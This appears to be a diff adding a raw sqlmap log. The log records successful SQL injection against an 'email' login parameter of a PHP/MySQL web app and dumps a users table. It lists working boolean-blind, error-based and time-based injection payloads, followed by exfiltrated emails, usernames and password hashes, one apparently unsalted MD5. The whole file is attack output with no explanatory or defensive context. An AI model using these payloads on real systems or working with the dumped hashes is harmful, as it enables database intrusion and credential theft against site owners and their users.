@@ -1,0 +1,31 @@
+sqlmap identified the following injection point(s) with a total of 251 HTTP(s) requests:
+---
+Parameter: email (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: email=-6101' OR 5029=5029#&password=test
+    Vector: OR [INFERENCE]#
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: email=test@test.com' AND GTID_SUBSET(CONCAT(0x716a7a7671,(SELECT (ELT(3510=3510,1))),0x717a6a6271),3510)-- AFIX&password=test
+    Vector: AND GTID_SUBSET(CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM])
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: email=test@test.com' AND (SELECT 2695 FROM (SELECT(SLEEP(5)))XcBZ)-- qsWO&password=test
+    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])
+---
+web application technology: PHP, PHP 8.2.12, Apache 2.4.58
+back-end DBMS: MySQL >= 5.6
+Database: webappsec
+Table: users
+[3 entries]
++----+---------------+----------------------------------------------------------------+----------+
+| id | email         | password                                                       | username |
++----+---------------+----------------------------------------------------------------+----------+
+| 3  | siva@mail.com | $2b$10$4qeSDzbItY4NZA0NNWz5xOqs1NP.h\\/jMT0vMuvKttyYpni3HqMk6G | siva     |
+| 4  | jay@mail.com  | aa718893bfe3e587047c81af40269d14                               | jayaraj  |
+| 5  | rock@mail.com | $2b$10$vsys1LkJxpYbzhBDAYcP3ekMxg4EX4cRqFNlGNxCG5EMy1jw\\/njxC | rock     |
++----+---------------+----------------------------------------------------------------+----------+
+
